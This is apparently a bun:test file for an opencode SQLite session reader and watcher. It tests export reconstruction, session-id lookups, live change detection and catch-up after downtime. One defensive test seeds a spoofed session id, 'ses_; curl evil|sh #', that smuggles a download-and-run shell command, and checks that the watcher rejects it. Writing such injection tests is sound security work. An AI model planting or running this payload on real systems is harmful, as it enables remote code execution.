// Coverage for opencode's SQLite read boundary and watcher:
//  (1) assembleOpencodeSession reconstructs the `opencode export` shape from the DB
//      (round-tripped against a real sanitized export fixture — the export IS what
//      opencode emits, so this cross-checks the SQL mapping against opencode itself);
//  (2) resolveOpencodeSessionCwd / sessionExistsInOpencodeDb (session-id binding);
//  (3) OpencodeStorageWatcher detects a live write and, with the tail classifier,
//      flips a streaming turn (no `completed`) to a finished one.
//
// Test DBs are built in a temp dir with the same schema opencode uses and seeded
// either from the sanitized fixture (real structure, zero private data) or from
// hand-authored synthetic rows — nothing reads the developer's real opencode.db.
import { describe, test, expect } from "bun:test";
import { Database } from "bun:sqlite";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import {
  OpencodeStorageWatcher,
  assembleOpencodeSession,
  resolveOpencodeSessionCwd,
  sessionExistsInOpencodeDb,
} from "./opencodeStorage.js";
import { classifyOpencodeTranscriptTail } from "./daemon.js";
import { parseOpencodeSessionFile } from "./parser.js";
import { clearPosition } from "./positionTracker.js";
import type { TranscriptDirEvent } from "./transcriptDirWatcher.js";

const FIX = path.join(__dirname, "__fixtures__", "opencode");

/** Create the opencode schema (subset this module reads) in a fresh temp DB. */
function createSchema(db: Database): void {
  db.run(
    "CREATE TABLE session (id TEXT PRIMARY KEY, project_id TEXT, directory TEXT, title TEXT, version TEXT, slug TEXT, time_created INTEGER, time_updated INTEGER);" +
      "CREATE TABLE message (id TEXT PRIMARY KEY, session_id TEXT, time_created INTEGER, time_updated INTEGER, data TEXT);" +
      "CREATE TABLE part (id TEXT PRIMARY KEY, message_id TEXT, session_id TEXT, time_created INTEGER, time_updated INTEGER, data TEXT);",
  );
}

/** Seed a DB from an `opencode export`-shaped object, storing the id as the column
 *  (opencode keeps id out of the `data` blob). Returns the session id. */
function seedFromExport(db: Database, exp: any, tBase = 1000): string {
  const info = exp.info;
  db.query(
    "INSERT INTO session (id, project_id, directory, title, version, slug, time_created, time_updated) VALUES (?,?,?,?,?,?,?,?)",
  ).run(info.id, info.projectID ?? "global", info.directory ?? "/tmp/x", info.title ?? "t", info.version ?? "1.18.3", info.slug ?? "s", info.time?.created ?? tBase, info.time?.updated ?? tBase);
  exp.messages.forEach((m: any, i: number) => {
    const { id, ...rest } = m.info;
    const t = m.info.time?.created ?? tBase + i;
    db.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
      .run(id, info.id, t, t, JSON.stringify(rest));
    (m.parts ?? []).forEach((p: any, j: number) => {
      const { id: pid, ...prest } = p;
      db.query("INSERT INTO part (id, message_id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?,?)")
        .run(pid, id, info.id, t, t, JSON.stringify(prest));
    });
  });
  return info.id;
}

function tmpDbPath(): string {
  return path.join(os.tmpdir(), `oc-db-${Date.now()}-${Math.random().toString(36).slice(2, 8)}.db`);
}

describe("assembleOpencodeSession (SQLite -> export shape)", () => {
  test("round-trips a real sanitized export through the DB and matches on parse", () => {
    const exp = JSON.parse(fs.readFileSync(path.join(FIX, "session-tools.sanitized.json"), "utf-8"));
    const dbPath = tmpDbPath();
    const db = new Database(dbPath);
    createSchema(db);
    const sid = seedFromExport(db, exp);
    db.close();

    const assembled = assembleOpencodeSession(sid, dbPath);
    expect(assembled).not.toBeNull();
    // Parsing the DB-assembled blob equals parsing opencode's own export blob:
    // the SQL mapping reproduces the export shape.
    expect(parseOpencodeSessionFile(assembled!))
      .toEqual(parseOpencodeSessionFile(JSON.stringify(exp)));

    fs.rmSync(dbPath, { force: true });
  });

  test("returns null for an unknown session", () => {
    const dbPath = tmpDbPath();
    const db = new Database(dbPath);
    createSchema(db);
    db.close();
    expect(assembleOpencodeSession("ses_missing", dbPath)).toBeNull();
    fs.rmSync(dbPath, { force: true });
  });
});

describe("session-id binding resolvers", () => {
  test("resolveOpencodeSessionCwd reads session.directory; existence check works", () => {
    const dbPath = tmpDbPath();
    const db = new Database(dbPath);
    createSchema(db);
    db.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
      .run("ses_binder", "/tmp/proj-x", "t", 1, 1);
    db.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
      .run("msg_1", "ses_binder", 1, 1, JSON.stringify({ role: "user", time: { created: 1 } }));
    db.close();

    expect(resolveOpencodeSessionCwd("ses_binder", dbPath)).toBe("/tmp/proj-x");
    expect(sessionExistsInOpencodeDb("ses_binder", dbPath)).toBe(true);
    expect(sessionExistsInOpencodeDb("ses_nope", dbPath)).toBe(false);
    fs.rmSync(dbPath, { force: true });
  });
});

function waitForSession(
  watcher: OpencodeStorageWatcher,
  predicate: (e: TranscriptDirEvent) => boolean,
  timeoutMs = 5000,
): Promise<TranscriptDirEvent> {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      watcher.off("session", onSession);
      reject(new Error("timed out waiting for opencode session event"));
    }, timeoutMs);
    const onSession = (e: TranscriptDirEvent) => {
      if (!predicate(e)) return;
      clearTimeout(timer);
      watcher.off("session", onSession);
      resolve(e);
    };
    watcher.on("session", onSession);
  });
}

describe("OpencodeStorageWatcher — live detection + working->complete flip", () => {
  test("detects a new turn and the completion write flips it to idle", async () => {
    const dbPath = tmpDbPath();
    const writer = new Database(dbPath);
    createSchema(writer);
    writer.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
      .run("ses_live", "/tmp/live", "t", 1000, 1000);
    writer.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
      .run("msg_u", "ses_live", 1000, 1000, JSON.stringify({ role: "user", time: { created: 1000 } }));
    writer.close();

    const watcher = new OpencodeStorageWatcher(dbPath, 100);
    watcher.start();
    // First poll (fresh temp path => watermark 0) backfills ses_live; the listeners
    // below attach afterward and observe the subsequent streaming writes.
    await new Promise((r) => setTimeout(r, 250));

    // Assistant turn STARTS: a new message row without `completed` -> active.
    const now = Date.now();
    const w2 = new Database(dbPath);
    const addPromise = waitForSession(watcher, (e) => e.sessionId === "ses_live");
    w2.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
      .run("msg_a", "ses_live", now, now, JSON.stringify({ role: "assistant", time: { created: now }, modelID: "big-pickle" }));
    w2.close();
    const addEvent = await addPromise;
    expect(addEvent.filePath).toBe("ses_live"); // per-session debounce key
    expect(classifyOpencodeTranscriptTail(assembleOpencodeSession("ses_live", dbPath)!)).toBe("active");

    // Assistant turn COMPLETES: same row updated with `completed` -> idle.
    const later = now + 1;
    const w3 = new Database(dbPath);
    const changePromise = waitForSession(watcher, (e) => e.sessionId === "ses_live");
    w3.query("UPDATE message SET time_updated = ?, data = ? WHERE id = 'msg_a'")
      .run(later, JSON.stringify({ role: "assistant", time: { created: now, completed: later }, modelID: "big-pickle", finish: "stop" }));
    w3.close();
    await changePromise;
    expect(classifyOpencodeTranscriptTail(assembleOpencodeSession("ses_live", dbPath)!)).toBe("idle");

    watcher.stop();
    clearPosition(dbPath);
    fs.rmSync(dbPath, { force: true });
  });

  // The catch-up gap fix: the watermark persists (positionTracker), so a session
  // that runs start-to-finish while the daemon is DOWN is emitted on the next start.
  test("a session completed while the daemon was down is caught up on the next start", async () => {
    const dbPath = tmpDbPath();
    const w = new Database(dbPath);
    createSchema(w);
    // Session A already exists and was accounted for by a prior run.
    w.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
      .run("ses_A", "/tmp/a", "t", 1000, 1000);
    w.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
      .run("msg_a1", "ses_A", 1000, 1000, JSON.stringify({ role: "assistant", time: { created: 1000, completed: 1000 } }));
    w.close();

    // Daemon run #1: first poll backfills A and PERSISTS the watermark past it.
    const run1 = new OpencodeStorageWatcher(dbPath, 50);
    const sawA = waitForSession(run1, (e) => e.sessionId === "ses_A");
    run1.start();
    await sawA;
    run1.stop(); // daemon goes DOWN

    // While DOWN: session B runs start-to-finish (completed), advancing the DB past
    // the persisted watermark. No watcher is running, so nothing observes it live.
    const w2 = new Database(dbPath);
    w2.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
      .run("ses_B", "/tmp/b", "t", 2000, 2000);
    w2.query("INSERT INTO message (id, session_id, time_created, time_updated, data) VALUES (?,?,?,?,?)")
      .run("msg_b1", "ses_B", 2000, 2000, JSON.stringify({ role: "assistant", time: { created: 2000, completed: 2000 } }));
    w2.close();

    // Daemon run #2 (restart): loads the persisted watermark and MUST emit B, but
    // not re-emit A (below the watermark).
    const run2 = new OpencodeStorageWatcher(dbPath, 50);
    const emitted: string[] = [];
    run2.on("session", (e) => emitted.push(e.sessionId));
    const caughtUp = waitForSession(run2, (e) => e.sessionId === "ses_B");
    run2.start();
    await caughtUp;
    await new Promise((r) => setTimeout(r, 150)); // give any stray A emit a chance to appear
    expect(emitted).toContain("ses_B");
    expect(emitted).not.toContain("ses_A"); // already synced, below the persisted watermark

    run2.stop();
    clearPosition(dbPath);
    fs.rmSync(dbPath, { force: true });
  });

  // Ingest-boundary RCE guard (security critic): opencode's session.id column is
  // externally writable (any process can INSERT). A spoofed row whose id merely starts
  // with "ses_" but carries shell syntax must NOT be emitted — it would become the
  // convex session_id and later an unescaped resume command. Only the real ses_<base62>
  // shape is tracked. SYNTHETIC rows.
  test("skips a spoofed ses_ id carrying shell syntax; tracks only the well-formed one", async () => {
    const dbPath = tmpDbPath();
    const db = new Database(dbPath);
    createSchema(db);
    const good = "ses_08f9926d3ffelzGS3Q3CteaeUk";
    const poison = "ses_; curl evil|sh #";
    for (const id of [good, poison]) {
      db.query("INSERT INTO session (id, directory, title, time_created, time_updated) VALUES (?,?,?,?,?)")
        .run(id, "/tmp/x", "t", 2000, 2000);
    }
    db.close();

    const emitted: string[] = [];
    const watcher = new OpencodeStorageWatcher(dbPath, 50);
    watcher.on("session", (e) => emitted.push(e.sessionId));
    const sawGood = waitForSession(watcher, (e) => e.sessionId === good);
    watcher.start();
    await sawGood;
    await new Promise((r) => setTimeout(r, 150)); // give a stray poison emit a chance

    expect(emitted).toContain(good);
    expect(emitted).not.toContain(poison);

    watcher.stop();
    clearPosition(dbPath);
    fs.rmSync(dbPath, { force: true });
  });
});
